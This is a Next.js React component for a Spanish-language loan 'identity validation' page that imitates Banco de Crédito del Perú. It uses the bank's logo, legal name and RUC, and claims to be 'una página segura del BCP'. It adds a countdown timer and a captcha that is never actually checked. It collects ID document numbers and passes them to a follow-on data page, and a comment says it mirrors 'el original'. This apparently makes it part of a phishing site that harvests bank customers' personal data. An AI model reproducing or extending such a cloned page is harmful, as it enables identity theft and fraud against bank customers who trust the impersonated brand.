// app/prestamo/validacion/ValidacionClient.tsx
"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

export default function ValidacionClient({
  amount,
  payDay,
}: {
  amount: string;
  payDay: string;
}) {
  const router = useRouter();

  // contador (300s)
  const [seconds, setSeconds] = useState(300);
  useEffect(() => {
    const t = setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000);
    return () => clearInterval(t);
  }, []);

  // formulario
  const [docType, setDocType] = useState<"DNI" | "CE">("DNI");
  const [docNumber, setDocNumber] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [code, setCode] = useState(() => randomCode(6));
  const refreshCode = () => setCode(randomCode(6));

  const onSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // validaciones mínimas para seguir (como el original)
    if (!docNumber || !captcha) return;
    const qs = new URLSearchParams({
      amount: String(Number(amount) || 0),
      payDay,
      docType,
      docNumber,
    }).toString();
    router.push(`/prestamo/datos?${qs}`);
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header azul con logo y contador */}
      <header className="bg-[color:var(--brand)] text-white">
        <div className="container-max h-12 flex items-center justify-between">
          <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
          <div className="flex items-center gap-2 text-sm font-semibold">
            <span>{seconds} segundos</span>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <path d="M9 2h6M12 8v5l3 2" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              <circle cx="12" cy="14" r="7" stroke="currentColor" strokeWidth="2"/>
            </svg>
          </div>
        </div>
      </header>

      <main className="container-max py-6">
        {/* Volver */}
        <button onClick={() => router.back()} className="flex items-center gap-2 text-[#2F476B] mb-4">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
            <path d="M15 18l-6-6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
          Volver
        </button>

        {/* Tarjeta */}
        <div className="rounded-[16px] border border-[color:var(--line)] bg-white shadow-[0_12px_28px_rgba(0,0,0,.08)] p-5 max-w-[380px]">
          <h1 className="text-2xl font-bold text-[color:var(--brand)]">Dinero al Instante</h1>
          <p className="text-[15px] text-[#5A6B84] mt-1">Valida tu identidad para continuar</p>

          <form onSubmit={onSubmit} className="mt-5 space-y-4">
            {/* Grupo: DNI + Nro de documento */}
            <div className="group-bcp">
              <div className="group-bcp__left">
                <select
                  value={docType}
                  onChange={(e) => setDocType(e.target.value as "DNI" | "CE")}
                  className="group-bcp__select"
                >
                  <option value="DNI">DNI</option>
                  <option value="CE">CE</option>
                </select>
                <svg className="group-bcp__chev" width="18" height="18" viewBox="0 0 24 24" fill="#2F476B">
                  <path d="M7 10l5 5 5-5H7z" />
                </svg>
              </div>
              <div className="group-bcp__right">
                <input
                  className="group-bcp__input"
                  placeholder="Nro de documento"
                  value={docNumber}
                  onChange={(e) => setDocNumber(e.target.value)}
                />
              </div>
            </div>

            {/* Grupo: CAPTCHA + Código */}
            <div className="group-bcp">
              <div className="group-bcp__left captcha-box">
                <span className="captcha-code">{code}</span>
              </div>
              <div className="group-bcp__right">
                <input
                  className="group-bcp__input"
                  placeholder="Código"
                  value={captcha}
                  onChange={(e) => setCaptcha(e.target.value)}
                />
              </div>
            </div>

            <button
              type="button"
              onClick={refreshCode}
              className="text-[#FF7A00] text-[14px] -mt-1"
            >
              Cambiar código
            </button>

            <button type="submit" className="btn-bcp">Continuar</button>
          </form>
        </div>

        {/* Footer legal */}
        <div className="max-w-[380px] mx-auto text-center text-[12px] text-[#8AA0B6] mt-6 space-y-1">
          <div className="flex items-center justify-center gap-2">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
              <path d="M12 1l9 5v12l-9 5-9-5V6l9-5z" stroke="currentColor" strokeWidth="1.4"/>
              <path d="M8 12h8M12 8v8" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/>
            </svg>
            <span>
              Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con nosotros al (01) 311-9898 o a través de nuestros medios digitales.
            </span>
          </div>
          <div className="pt-3 border-t border-[#E5EDF6]">
            Banco de Crédito del Perú S.A<br/>
            RUC: 20100047218<br/>
            © 2025 VIABCP.com<br/>
            Todos los derechos reservados
          </div>
        </div>
      </main>
    </div>
  );
}

function randomCode(n: number) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let out = "";
  for (let i = 0; i < n; i++) out += chars[Math.floor(Math.random() * chars.length)];
  return out;
}
